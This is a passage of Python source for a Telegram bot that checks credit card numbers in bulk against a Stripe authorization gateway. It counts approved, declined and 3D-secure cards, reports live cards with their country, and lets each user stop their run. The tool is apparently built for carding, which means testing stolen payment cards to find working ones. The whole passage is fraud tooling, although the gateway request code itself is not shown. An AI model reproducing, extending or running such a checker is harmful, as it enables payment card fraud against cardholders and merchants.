𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝗧𝗶𝗺𝗲: {execution_time:.2f} seconds
</b>'''
                bot.send_message(message.chat.id, msg, parse_mode="HTML")

            elif any(x in result.lower() for x in ["3d_required", "otp", "action_required","3d","risk"]):
                otp_cards += 1
            else:
                declined += 1

            keyboard = InlineKeyboardMarkup(row_width=1)
            keyboard.add(
                InlineKeyboardButton(f"Status ➜ {result}", callback_data="noop"),
                InlineKeyboardButton(f"Approved ✅ ➜ {approved}", callback_data="noop"),
                InlineKeyboardButton(f"Declined ❌ ➜ {declined}", callback_data="noop"),
                InlineKeyboardButton(f"3D Card 🏴‍☠️ ➜ {otp_cards}", callback_data="noop"),
                InlineKeyboardButton(f"Total ♻ ➜ {len(checked_cards)}/{total}", callback_data="noop"),
                InlineKeyboardButton("Stop", callback_data=f"stopstxt_{user_id}")
            )

            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=message_id,
                text=f"Checking Card <code>{cc}</code>\nGate ➜ <b>stripe auth play </b>",
                reply_markup=keyboard,
                parse_mode="HTML"
            )

            time.sleep(4)
            checked_cards.add(cc)

        elapsed = time.time() - start_all
        elapsed_formatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))

        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=message_id,
            text=f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - stripe auth play ♻️\n\n"
                 f"- 𝐓𝐨𝐭𝐚𝐥 𝐂𝐂 𝐈𝐧𝐩𝐮𝐭 -  {total}\n"
                 f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜   {approved}\n"
                 f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜  {declined}\n"
                 f"• 3D Card 🏴‍☠️ ➜  {otp_cards}\n"
                 f"Time: {elapsed_formatted}\n"
                 f"𝐒𝐭𝐚𝐭𝐮𝐬 - Checked All ✅\n",
                 
            parse_mode="HTML"
        )        

    finally:
        active_checks_stxt[user_id] = max(0, active_checks_stxt.get(user_id, 1) - 1)
        stopuser_stxt.pop(user_id, None)


@bot.callback_query_handler(func=lambda call: call.data.startswith('stopstxt_'))
def stop_stxt(call):
    user_id = call.data.split('_')[1]
    if call.from_user.id == int(user_id):
        if user_id not in stopuser_stxt:
            stopuser_stxt[user_id] = {}
        stopuser_stxt[user_id]['status'] = 'stop'
        bot.answer_callback_query(call.id, "Stopping your check...")
    else:
        bot.answer_callback_query(call.id, "❌ You can't stop someone else's  check.")


print("Bot is running...")
bot.infinity_polling()
